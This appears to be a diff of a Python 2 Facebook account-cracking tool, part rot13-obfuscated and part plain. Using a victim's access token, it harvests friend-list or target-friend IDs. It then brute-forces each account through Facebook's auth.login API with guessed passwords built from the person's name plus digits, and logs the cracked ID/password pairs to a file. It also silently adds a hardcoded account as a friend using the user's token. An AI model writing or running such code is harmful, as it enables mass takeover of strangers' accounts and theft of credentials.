prxcbvag.nccraq(hfre+cnff5)\t\t\t\t\t\n\t\t\t\t\t\t                               ryfr:\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t                           cnff6 = \'1234554321\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                           qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff6)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                           d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                           vs \'npprff_gbxra\' va d:\t\n\t\t\t\t\t\t\t\t                           k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                                           m = wfba.ybnqf(k.grkg)\n\t\t\t\t                                                           cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff6 + \'\\a\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                           bxf.nccraq(hfre+cnff6)\n                                                                                   ryfr:\n\t\t\t                                                                   vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                                               cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff6 + \'\\a\'\n\t\t\t\t                                                               prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                                               prx.jevgr("VQ:" +hfre+ " Cj:" +cnff6+"\\a")\n\t\t\t\t                                                               prx.pybfr()\n\t\t\t\t                                                               prxcbvag.nccraq(hfre+cnff6)\t\n\t\t\t\t\t\t                                           ryfr:\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t                               cnff7 = o[\'svefg_anzr\']+\'12345\'\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t                               qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff7)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t                               d = wfba.ybnq(qngn)\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t                               vs \'npprff_gbxra\' va d:\t\t\n\t\t\t\t                                                                       k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                                                       m = wfba.ybnqf(k.grkg)\n\t\t\t\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\n\t\t\t\t\t\t\t\t\t                               cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff7 + \'\\a\'\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t                               bxf.nccraq(hfre+cnff7)\n                                                                                               ryfr:\n\t\t\t                                                                               vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                                                           cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                                                           cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff7 + \'\\a\'\n\t\t\t\t                                                                           prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                                                           prx.jevgr("VQ:" +hfre+ " Cj:" +cnff7+"\\a")\n\t\t\t\t                                                                           prx.pybfr()\n\t\t\t\t                                                                           prxcbvag.nccraq(hfre+cnff7)           \t\t\t\t\t\n\t\t\t\t\t\t\t\t                                       ryfr:\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t                           cnff8 = o[\'ynfg_anzr\'] + \'12345\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                                                   qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff8)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                                                   d = wfba.ybnq(qngn)\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t                                                                                   vs \'npprff_gbxra\' va d:\t\t\n\t\t\t\t\t\t\t\t\t\t                                   k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                                                                   m = wfba.ybnqf(k.grkg)\n\t\t\t\t                                                                                   cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff8 + \'\\a\'\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t                                                                                   bxf.nccraq(hfre+cnff8)\n                                                                                                           ryfr:\n\t\t\t                                                                                           vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                                                                       cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                                                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                                                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                                                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff8 + \'\\a\'\n\t\t\t\t                                                                                       prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                                                                       prx.jevgr("VQ:" +hfre+ " Cj:" +cnff8+"\\a")\n\t\t\t\t                                                                                       prx.pybfr()\n\t\t\t\t                                                                                       prxcbvag.nccraq(hfre+cnff8)   \t\n\t\t\t\t\t\t\t\t\t\t                                   ryfr:\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t                                       cnff9 = o[\'svefg_anzr\'] + \'1234567890\'\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t                                       qngn = heyyvo.heybcra("uggcf://o-ncv.snprobbx.pbz/zrgubq/nhgu.ybtva?npprff_gbxra=237759909591655%25257P0s140nnorqso65np27n739rq1n2263o1&sbezng=wfba&fqx_irefvba=2&rznvy="+(hfre)+"&ybpnyr=ra_HF&cnffjbeq="+(cnff9)+"&fqx=vbf&trarengr_frffvba_pbbxvrf=1&fvt=3s555s99so61spq7nn0p44s58s522rs6")\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t                                       d = wfba.ybnq(qngn)\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t                                       vs \'npprff_gbxra\' va d:\t\t\n\t\t                                                                                                               k = erdhrfgf.trg("uggcf://tencu.snprobbx.pbz/"+hfre+"?npprff_gbxra="+d[\'npprff_gbxra\'])\n\t\t\t\t                                                                                               m = wfba.ybnqf(k.grkg)\n\t\t\t\t\t\t\t\t\t\t\t                                       cevag \'\\k1o[1;94z[  ✓  ] \\k1o[1;92zUnpx100%💉\'\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zAnzr \\k1o[1;91z    ✯ \\k1o[1;92z\' + o[\'anzr\']\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zVQ \\k1o[1;91z      ✯ \\k1o[1;92z\' + hfre\t\n\t\t\t\t\t\t\t\t\t\t\t                                       cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;91zCnffjbeq \\k1o[1;91z✯ \\k1o[1;92z\' + cnff9 + \'\\a\'\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t                                       bxf.nccraq(hfre+cnff9)\n                                                                                                                       ryfr:\n\t\t\t                                                                                                       vs \'jjj.snprobbx.pbz\' va d["reebe_zft"]:\n\t\t\t\t                                                                                                   cevag \'\\k1o[1;94z[ ❥ ] \\k1o[1;94zPurpxcbvag\'\n\t\t\t\t                                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zAnzr \\k1o[1;94z    ✯ \\k1o[1;95z\' + o[\'anzr\']\n\t\t\t\t                                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zVQ \\k1o[1;94z      ✯ \\k1o[1;95z\' + hfre\n\t\t\t\t                                                                                                   cevag \'\\k1o[1;94z[•⚔•] \\k1o[1;94zCnffjbeq \\k1o[1;94z✯ \\k1o[1;95z\' + cnff9 + \'\\a\'\n\t\t\t\t                                                                                                   prx = bcra("bhg/fhcre_pc.gkg", "n")\n\t\t\t\t                                                                                                   prx.jevgr("VQ:" +hfre+ " Cj:" +cnff9+"\\a")\n\t\t\t\t                                                                                                   prx.pybfr()\n\t\t\t\t                                                                                                   prxcbvag.nccraq(hfre+cnff9)\t\t\n\t\t\t\t\t\t\t\t\t\t\t                                       \n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\trkprcg:\n\t\t\tcnff\n\t\t\n\tc = GuernqCbby(30)\n\tc.znc(znva, vq)\n\tcevag "\\033[1;95z•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\\033[1;91zOynpx404\\033[1;95z•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"\n\tcevag "  \\033[1;91z«---•◈•---Qrirybcrq Ol zbunzznq unpxre--•◈•---»" #Qri:ZBUNZZNQ\n\tcevag \'\\033[1;93z✅Cebprff Unf Orra Pbzcyrgrq Cerff➡ Pgey+M.↩ Arkg Glcr (clguba2 OynpxVQ.cl)↩\\033[1;97z....\'\n\tcevag"\\033[1;91zGbgny BX/\\k1o[1;95zPC \\033[1;93z: \\033[1;91z"+fge(yra(bxf))+"\\033[1;93z/\\033[1;96z"+fge(yra(prxcbvag))\n\tcevag ybtb\n\t\n\tenj_vachg("\\a\\033[1;95z[\\033[1;91zOnpx\\033[1;95z]")\n\tzrah()\n\nvs __anzr__ == \'__znva__\':\n\tybtva()\n''',__))('rot_13',__import__('codecs').decode))
+#Hi ! BaY -_-
+#coding=utf-8
+
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+
+def keluar():
+	print "\033[1;96m[!] \x1b[1;91mExit"
+	os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+		
+		
+#### LOGO ####
+logo = """
+
+
+                                                   
+______ _       ___  _____  _   __
+| ___ \ |     / _ \/  __ \| | / /
+| |_/ / |    / /_\ \ /  \/| |/ / 
+| ___ \ |    |  _  | |    |    \ 
+| |_/ / |____| | | | \__/\| |\  \
+\____/\_____/\_| |_/\____/\_| \_/
+                                 
+                                 
+                                             
+                                                                        
+  _____ _____  
+ |_   _|  __ \ 
+   | | | |  | |
+   | | | |  | |
+  _| |_| |__| |
+ |_____|_____/ 
+               
+               
+                                                                  
+--------------------------------------------------
+ Author      : B L A C K M I R O R
+ 
+ GitHub     : https://github.com/fardinHack
+ 
+ YouTube  : Not Yet
+ 
+Telegram  : BESTxHACKER
+
+--------------------------------------------------
+"""
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print logo
+
+CorrectUsername = "Black"
+CorrectPassword = "ID"
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("Tool Username »» ")
+    if (username == CorrectUsername):
+    	password = raw_input("Tool Password »» ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #Dev: Black_Miror
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;96mWrong Password"
+            os.system('xdg-open https://t.me/sultani1122')
+    else:
+        print "\033[1;96mWrong Username"
+        os.system('xdg-open https://t.me/BESTxHACKER')
+
+def login():
+	os.system('clear')
+	try:
+		toket = open('.fb_token.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		print("[1] Token login")
+		print("[2] id/pass login")
+		print("")
+		login_select()
+def login_select():
+    afza = raw_input(" Choose login method >>> ")
+    if afza =="1":
+        os.system("clear")
+        print logo
+        print("")
+        print("\t    \033[1;32mFB Token Login\033[0;97m")
+        print("")
+        token = raw_input(" Past token here : ")
+        token_s = open(".fb_token.txt","w")
+        token_s.write(token)
+        token_s.close()
+        try:
+            r = requests.get("https://graph.facebook.com/me?access_token="+token)
+            q = json.loads(r.text)
+            name = q["name"]
+            nm = name.rsplit(" ")[0]
+            print("")
+            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
+            time.sleep(3)
+            menu()
+        except (KeyError , IOError):
+            print("")
+            print("\t    \033[1;31mToken not valid\033[0;97m")
+            print("")
+            raw_input(" Press enter to try again ")
+            login()
+    if afza =="2":
+        login_fb()
+    else:
+        print("")
+        print("\t    "+c+"Select valid method"+c2)
+        print("")
+        login_select()
+def login_fb():
+	os.system("clear")
+	print logo
+	print("")
+	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
+	print("")
+	id = raw_input(" ID/Mail/Num : ")
+	id1=id.replace(' ','')
+	id2=id1.replace('(','')
+	uid=id2.replace(')','')
+	pwd = raw_input(" Password   : ")
+	print("")
+	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
+	q = json.loads(data)
+	if "loc" in q:
+		hamza = open(".fb_token.txt","w")
+		hamza.write(q["loc"])
+		hamza.close()
+		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
+		time.sleep(1)
+		print("\t    \033[1;32mLogged in successfully\033[0;97m")
+		time.sleep(1)
+		menu()
+	elif "www.facebook.com" in q["error"]:
+		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
+		print("")
+		time.sleep(1)
+		raw_input(" Press enter to try again ")
+		login_fb()
+	else:
+		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
+		print("")
+		raw_input(" Press enter to try again ")
+		login_fb()
+
+
+def menu():
+	os.system('clear')
+	try:
+		toket=open('.fb_token.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;91m[!] Token invalid"
+		os.system('rm -rf .fb_token.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+		b = json.loads(ots.text)
+		sub = str(b['summary']['total_count'])
+	except KeyError:
+		os.system('clear')
+		print"\033[1;91mYour Account is on Checkpoint"
+		os.system('rm -rf .fb_token.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;92mThere is no internet connection"
+		keluar()
+	os.system("clear")
+	print logo
+	print "\033[1;36;40m      ╔═════════════════════════════════╗"
+	print "\033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
+	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
+	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
+	print "\033[1;36;40m      ╚═════════════════════════════════╝"
+	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Hacking"	
+	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
+	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
+	pilih()
+
+def pilih():
+	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
+	if unikers =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+	elif unikers =="1":
+		super()
+	elif unikers =="2":
+		os.system('clear')
+		print logo
+		print " \033[1;36;40m●══════════════════◄►══════════════════●\n"
+		os.system('git pull origin master')
+		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+		menu()
+	elif unikers =="0":
+		print('Token Removed')
+		os.system('rm -rf .fb_token.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+
+def super():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('.fb_token.txt','r').read()
+	except IOError:
+		print"\x1b[1;91mToken invalid"
+		os.system('rm -rf .fb_token.txt')
+		time.sleep(1)
+		login()
+	os.system('clear')
+	print logo
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts ."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back"
+	pilih_super()
+
+def pilih_super():
+	peak = raw_input("\n\033[1;91m^.^Choose an Option>>> \033[1;95m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	elif peak =="1":
+		os.system('clear')
+		print logo
+		print "\033[1;97m•◈•══════•◈•\033[1;91mloveAKM\033[1;97m•◈•══════•◈•"
+		print('\033[1;91mGetting IDs \033[1;91m...')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif peak =="2":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
+		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackID\033[1;95m•◈•══════••◈•"
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;91mName\033[1;95m:\033[1;95m "+op["name"]
+		except KeyError:
+			print"\x1b[1;91mID Not Found!"
+			raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
+			super()
+		print"\033[1;91mGetting IDs\033[1;97m..."
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="0":
+		menu()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	
+	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
+	print('\033[1;34;40m[✺] Please Wait...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
+	print "   \033[1;92m●══════════════════◄►══════════════════●"
+
+	print('           \033[1;91mBlackMiror start cloning Wait...')
+	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
+
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass #Dev:rana
+		try:
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
+			b = json.loads(a.text)												
+			pass1 = b['first_name'] + '2004'												
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			q = json.load(data)												
+			if 'access_token' in q:
+				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				z = json.loads(x.text)
+				print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
+				print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass1 + '\n'											
+				oks.append(user+pass1)
+                        else:
+			        if 'www.facebook.com' in q["error_msg"]:
+				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				    print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b ['name']
+				    print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				    print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass1 + '\n'
+				    cek = open("out/super_cp.txt", "a")
+				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
+				    cek.close()
+				    cekpoint.append(user+pass1)
+                                else:
+				    pass2 = b['first_name'] + '2005'										
+                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			            q = json.load(data)												
+			            if 'access_token' in q:	
+				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				            z = json.loads(x.text)
+				            print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				            print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				            print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user								
+				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
+				            oks.append(user+pass2)
+                                    else:
+			                   if 'www.facebook.com' in q["error_msg"]:
+				               print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				               print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				               print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				               print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass2 + '\n'
+				               cek = open("out/super_cp.txt", "a")
+				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
+				               cek.close()
+				               cekpoint.append(user+pass2)								
+				           else:											
+					       pass3 = b['last_name']+'123'										
+					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
+					       q = json.load(data)										
+					       if 'access_token' in q:	
+						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                       z = json.loads(x.text)
+						       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'								
+						       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']									
+						       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user							
+						       print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass3 + '\n'									
+						       oks.append(user+pass3)
+                                               else:
+			                               if 'www.facebook.com' in q["error_msg"]:
+				                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mCheckpoint'
+				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
+				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
+				                           print '\x1b[1;94m[•⚔•] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass3 + '\n'
+				                           cek = open("out/super_cp.txt", "a")
+				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
+				                           cek.close()
+				                           cekpoint.append(user+pass3)									
+					               else:										
+						           pass4 = b['first_name'] + '123'											
+			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			                                   q = json.load(data)												
+			                                   if 'access_token' in q:		
+						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				                                   z = json.loads(x.text)
+				                                   print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
+				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
+				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user											
+				                                   print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass4 + '\n'											
+				                                   oks.append(user+pass4)
+                                                           else:
